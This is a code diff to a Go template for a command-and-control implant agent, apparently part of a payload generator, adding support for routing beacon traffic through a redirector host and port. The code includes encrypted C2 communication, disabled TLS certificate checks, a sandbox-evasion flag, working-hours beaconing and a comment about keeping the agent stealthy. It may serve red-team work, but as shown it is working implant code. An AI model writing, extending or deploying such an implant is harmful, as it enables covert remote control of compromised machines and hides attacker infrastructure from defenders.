@@ -173,6 +173,9 @@ type {AGENT_STRUCT_NAME} struct {
 		Timezone  string   `json:"timezone"`
 		Days      []int    `json:"days"`
 	}
+	{AGENT_REDIRECTOR_HOST_FIELD}       string
+	{AGENT_REDIRECTOR_PORT_FIELD}       int
+	{AGENT_USE_REDIRECTOR_FIELD}        bool
 }
 
 type {TASK_STRUCT_NAME} struct {
@@ -195,7 +198,7 @@ type {API_RESPONSE_STRUCT_NAME} struct {
 	TaskID   string      `json:"task_id,omitempty"`
 }
 
-func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL string, disableSandbox bool) (*{AGENT_STRUCT_NAME}, error) {
+func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, redirectorPort int, useRedirector bool, disableSandbox bool) (*{AGENT_STRUCT_NAME}, error) {
 	var fernetKey fernet.Key
 
 	if secretKey != "" {
@@ -248,6 +251,9 @@ func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL string, disableSandbox boo
 			Timezone:  "{WORKING_HOURS_TIMEZONE}",
 			Days:      []int{{WORKING_HOURS_DAYS}},
 		},
+		{AGENT_REDIRECTOR_HOST_FIELD}:       redirectorHost,
+		{AGENT_REDIRECTOR_PORT_FIELD}:       redirectorPort,
+		{AGENT_USE_REDIRECTOR_FIELD}:        useRedirector,
 	}
 
 	return agent, nil
@@ -293,7 +299,17 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_DECRYPT_DATA_FUNC}(encryptedData string) (s
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data interface{}) (*{API_RESPONSE_STRUCT_NAME}, error) {
 	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)
-	url := a.{AGENT_C2_URL_FIELD} + uri
+
+	var url string
+	if a.{AGENT_USE_REDIRECTOR_FIELD} {
+		protocol := "http"
+		if strings.HasPrefix(a.{AGENT_C2_URL_FIELD}, "https") {
+			protocol = "https"
+		}
+		url = fmt.Sprintf("%s://%s:%d%s", protocol, a.{AGENT_REDIRECTOR_HOST_FIELD}, a.{AGENT_REDIRECTOR_PORT_FIELD}, uri)
+	} else {
+		url = a.{AGENT_C2_URL_FIELD} + uri
+	}
 
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -1419,11 +1435,14 @@ func main() {
 	agentID := "{AGENT_ID}"
 	secretKey := "{SECRET_KEY}"
 	c2URL := "{C2_URL}"
+	redirectorHost := "{REDIRECTOR_HOST}"
+	redirectorPort := {REDIRECTOR_PORT}
+	useRedirector := {USE_REDIRECTOR} // Will be true or false based on generation flag
 	disableSandbox := {DISABLE_SANDBOX} // Will be true or false based on generation flag
 
 	// Removed debug prints to keep agent stealthy
 
-	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, disableSandbox)
+	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost, redirectorPort, useRedirector, disableSandbox)
 	if err != nil {
 		os.Exit(1)
 	}
